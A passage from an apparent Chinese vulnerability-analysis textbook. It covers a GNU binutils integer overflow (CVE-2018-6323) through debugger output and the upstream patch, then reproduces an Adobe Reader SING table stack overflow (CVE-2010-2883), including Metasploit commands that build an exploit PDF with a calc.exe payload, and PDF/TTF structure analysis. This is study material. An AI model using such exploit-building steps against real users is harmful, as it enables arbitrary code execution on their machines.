7.1.7 CVE-2018-6323 GNU binutils elf_object_p 整型溢出漏洞
---------------]
0x80aeba8 : push edx
0x80aeba9 : push eax
0x80aebaa : push ebx
=> 0x80aebab : call 0x8099540 
0x80aebb0 : mov DWORD PTR [esi
+0x50],eax
0x80aebb3 : mov eax,DWORD PTR
[ebx+0xa0]
0x80aebb9 : add esp,0x10
0x80aebbc : mov ecx,DWORD PTR
[eax+0x50]
Guessed arguments:
arg[0]: 0x8250a08 --> 0x8250810 ("test")
arg[1]: 0x0
arg[2]: 0x0
[------------------------------------stack----------------------
---------------]
0000| 0xbfffec10 --> 0x8250a08 --> 0x8250810 ("test")
0004| 0xbfffec14 --> 0x0
0008| 0xbfffec18 --> 0x0
0012| 0xbfffec1c --> 0x80aea71 (: mo
v eax,DWORD PTR [esi+0x28])
0016| 0xbfffec20 --> 0xb7fe97eb (: add esi,0
x15815)
0020| 0xbfffec24 --> 0x8250ac8 --> 0x464c457f
0024| 0xbfffec28 --> 0xd ('\r')
0028| 0xbfffec2c --> 0x0
[---------------------------------------------------------------
---------------]
Legend: code, data, rodata, value
0x080aebab 780 elf_tdata (abfd)->phdr = (Elf_Interna
l_Phdr *) bfd_alloc (abfd, amt);
在后续的过程中，从 bfd_close_all_done() 到 objalloc_free() ，用于清
理释放内存，其中就对 bfd_alloc() 分配的内存区域进行了 free() 操作，而
这又是一个不存在的地址，于是抛出了异常。
1620
7.1.7 CVE-2018-6323 GNU binutils elf_object_p 整型溢出漏洞
补丁
该漏洞在 binutils-2.30 中被修复，补丁将 i_ehdrp->e_shnum 转换成 unsigned
long 类型的 bfd_size_type ，从而避免整型溢出。BFD 开发文件包含在软件包
binutils-dev 中：
// /usr/include/bfd.h
typedef unsigned long bfd_size_type;
由于存在回绕，一个无符号整数表达式永远无法求出小于零的值，也就不会产生溢
出。
所谓回绕，可以看下面这个例子：
unsigned int ui;
ui = UINT_MAX; // 在 32 位上为 4 294 967 295
ui++;
printf("ui = %u\n", ui); // ui = 0
ui = 0;
ui--;
printf("ui = %u\n", ui); // 在 32 位上，ui = 4 294 967 295
补丁如下：
$ git show 38e64b0ecc7f4ee64a02514b8d532782ac057fa2 bfd/elfcode.
h
commit 38e64b0ecc7f4ee64a02514b8d532782ac057fa2
Author: Alan Modra 
Date: Thu Jan 25 21:47:41 2018 +1030
PR22746, crash when running 32-bit objdump on corrupted file
Avoid unsigned int overflow by performing bfd_size_type mult
iplication.
PR 22746
* elfcode.h (elf_object_p): Avoid integer overflow.
1621
7.1.7 CVE-2018-6323 GNU binutils elf_object_p 整型溢出漏洞
diff --git a/bfd/elfcode.h b/bfd/elfcode.h
index 00a9001..ea1388d 100644
--- a/bfd/elfcode.h
+++ b/bfd/elfcode.h
@@ -680,7 +680,7 @@ elf_object_p (bfd *abfd)
if (i_ehdrp->e_shnum > ((bfd_size_type) -1) / sizeof (*i_
shdrp))
goto got_wrong_format_error;
#endif
- amt = sizeof (*i_shdrp) * i_ehdrp->e_shnum;
+ amt = sizeof (*i_shdrp) * (bfd_size_type) i_ehdrp->e_shnu
m;
i_shdrp = (Elf_Internal_Shdr *) bfd_alloc (abfd, amt);
if (!i_shdrp)
goto got_no_match;
@@ -776,7 +776,7 @@ elf_object_p (bfd *abfd)
if (i_ehdrp->e_phnum > ((bfd_size_type) -1) / sizeof (*i_
phdr))
goto got_wrong_format_error;
#endif
- amt = i_ehdrp->e_phnum * sizeof (*i_phdr);
+ amt = (bfd_size_type) i_ehdrp->e_phnum * sizeof (*i_phdr);
elf_tdata (abfd)->phdr = (Elf_Internal_Phdr *) bfd_alloc
(abfd, amt);
if (elf_tdata (abfd)->phdr == NULL)
goto got_no_match;
打上补丁之后的 objdump 没有再崩溃：
$ objdump -v | head -n 1
GNU objdump (GNU Binutils) 2.30
$ objdump -x test
objdump: test: Memory exhausted
参考资料
1622
7.1.7 CVE-2018-6323 GNU binutils elf_object_p 整型溢出漏洞
https://www.cvedetails.com/cve/CVE-2018-6323/
GNU binutils 2.26.1 - Integer Overflow (POC)
1623
7.1.8 CVE-2010-2883 Adobe CoolType SING 表栈溢出漏洞
7.1.8 CVE-2010-2883 Adobe CoolType
SING 表栈溢出漏洞
漏洞描述
漏洞复现
漏洞分析
参考资料
下载文件
漏洞描述
Adobe Reader 和 Acrobat 9.4 之前版本的 CoolType.dll 中存在基于栈的缓冲区溢
出漏洞。远程攻击者可借助带有 TTF 字体的 Smart INdependent Glyphlets (SING)
表格中超长字段的 PDF 文件执行任意代码或者导致拒绝服务。
漏洞复现
推荐使用的环境 备注
操作系统 Windows XP SP3 体系结构：32 位
调试器 OllyDbg 版本号：吾爱专版
反汇编器 IDA Pro 版本号：6.8
漏洞软件 Adobe Reader 版本号：9.3.4
我们利用 Metasploit 来生成攻击样本：
1624
7.1.8 CVE-2010-2883 Adobe CoolType SING 表栈溢出漏洞
msf > search cve-2010-2883
Name Disclosure Da
te Rank Description
---- -------------
-- ---- -----------
exploit/windows/fileformat/adobe_cooltype_sing 2010-09-07
great Adobe CoolType SING Table "uniqueName" Stack Buffer O
verflow
msf > use exploit/windows/fileformat/adobe_cooltype_sing
msf exploit(windows/fileformat/adobe_cooltype_sing) > show info
msf exploit(windows/fileformat/adobe_cooltype_sing) > set payloa
d windows/exec
payload => windows/exec
msf exploit(windows/fileformat/adobe_cooltype_sing) > set cmd ca
lc.exe
cmd => calc.exe
msf exploit(windows/fileformat/adobe_cooltype_sing) > set filena
me cve20102883.pdf
filename => cve20102883.pdf
msf exploit(windows/fileformat/adobe_cooltype_sing) > exploit
[*] Creating 'cve20102883.pdf' file...
[+] cve20102883.pdf stored at /home/firmy/.msf4/local/cve2010288
3.pdf
使用漏洞版本的 Adobe Reader 打开样本，即可弹出计算器。
漏洞分析
PDF 文件格式
首先当然得知道 PDF 格式是怎样的。
1625
7.1.8 CVE-2010-2883 Adobe CoolType SING 表栈溢出漏洞
|------------|
| header |
|------------|
| body |
|------------|
| xref table |
|------------|
| trailer |
|------------|
由 4 个部分组成：
header：文件的第一行，指明了 PDF 文件的版本号，通常格式是 %PDF-
1.x 。
body：文件的主体部分，通常由对象文件组成，包括文本、图片和其他的多媒
体文件等。
xref table：包含了对文件中所有对象的引用，通过它可以知道文件中有多少对
象、对象的偏移以及字节长度。
trailer：包含指向交叉引用表以及关键对象的指针，并以 %%EOF 标记文件结
束。
当我们对一个 PDF 文件执行 Save（保存）操作时，新添加的信息将会附加到原文
件的末尾，即所谓的增量保存。这些信息主要由 3 部分（body changes, xref,
trailer）组成，此时的 PDF 文件如下所示：
1626
7.1.8 CVE-2010-2883 Adobe CoolType SING 表栈溢出漏洞
|--------------|
| header | ------------
|--------------|
| body |
|--------------| Original File
| xref table |
|--------------|
| trailer | ------------
|--------------|
| body changes |
|--------------| Update 1
| xref |
|--------------|
| trailer | ------------
|--------------|
| ... | ...
|--------------|
| body changes | ------------
|--------------|
| xref | Update n
|--------------|
| trailer | ------------
|--------------|
这样子虽然方便，但体积会越来越大。此时我们可以执行 Save as（另存为）操
作，将所有的更新信息合并成一个完整的新的 PDF，格式回到一开始的结构，体积
也相应的有所减小。
例如可以利用工具 PDFStreamDumper 解析我们的样本，其 xref 和 trailer 如下所
示：
1627
7.1.8 CVE-2010-2883 Adobe CoolType SING 表栈溢出漏洞
xref
0 15
0000000000 65535 f
0000000015 00000 n
0000000133 00000 n
0000000264 00000 n
0000000294 00000 n
0000000334 00000 n
0000000465 00000 n
0000000497 00000 n
0000000713 00000 n
0000000835 00000 n
0000001006 00000 n
0000041366 00000 n
0000041449 00000 n
0000045319 00000 n
0000045358 00000 n
trailer
>
startxref
45789
%%EOF
.
该节区的对象的起始编号为 0,包含的对象个数为 15 个，每个对象在交叉引用表中
占据一行。我们看到每行分为三列，分别表示对象在 PDF 中的文件偏移、对象的
生成号和是否使用标志（ f 表示 free，n 表示 used）。第一行对应的对象 ID 为
0，生成号总是 65535，而最后一行的生成号总是 0。
TTF 文件格式
根据漏洞通告，我们知道是 TTF 字体的 SING 表引起的溢出。所以再来看一下
TTF 文件格式。
TTF 包含有一个表 TableDirectory，其中有一个 TableEntry 结构项，包含了资源标
记、校验和、偏移量和每个表的大小：
1628
7.1.8 CVE-2010-2883 Adobe CoolType SING 表栈溢出漏洞
typedef sturct
{
char tag[4];
ULONG checkSum;
ULONG offset;
ULONG length;
} TableEntry;
typedef struct
{
Fixed sfntversion;
USHORT numTables;
USHORT searchRange;
USHORT entrySelector;
USHORT rangeShift;
TableEntry entries[numTables];
} TableDirectory;
另外，SING 表的结构如下：
typedef struct
{
USHORT tableVersionMajor;
USHORT tableVersionMinor;
USHORT glyphletVersion;
USHORT embeddinginfo;
USHORT mainGID;
USHORT unitsPerEm;
SHORT vertAdvance;
SHORT vertOrigin;
BYTE[28] uniqueName;
BYTE[16] METAMD5;
BYTE nameLength;
BYTE[] baseGlyphName;
} SINGTable;
还是利用 PDFStreamDumper，从样本里将 TTF 取出来，需要注意的是 TTF 采用
大端序。
1629
7.1.8 CVE-2010-2883 Adobe CoolType SING 表栈溢出漏洞
$ xxd -g1 hexC0E5.tmp | grep -A1 "SING"
000000e0: 05 47 06 3a 00 00 eb 2c 00 00 00 20 53 49 4e 47
.G.:...,... SING
000000f0: d9 bc c8 b5 00 00 01 1c 00 00 1d df 70 6f 73 74
............post
加粗部分即 SING 表目录项，其 offset 域为 0x0000011c 。
于是找到 SING 表，其中加粗部分为 uniqueName 域：
$ xxd -g1 hexC0E5.tmp | grep -A3 "00000110"
00000110: 3b 07 f1 00 00 00 20 f8 00 00 05 68 00 00 01 00
;..... ....h....
00000120: 01 0e 00 01 00 00 00 00 00 00 00 3a 92 f3 5e 4d
...........:..^M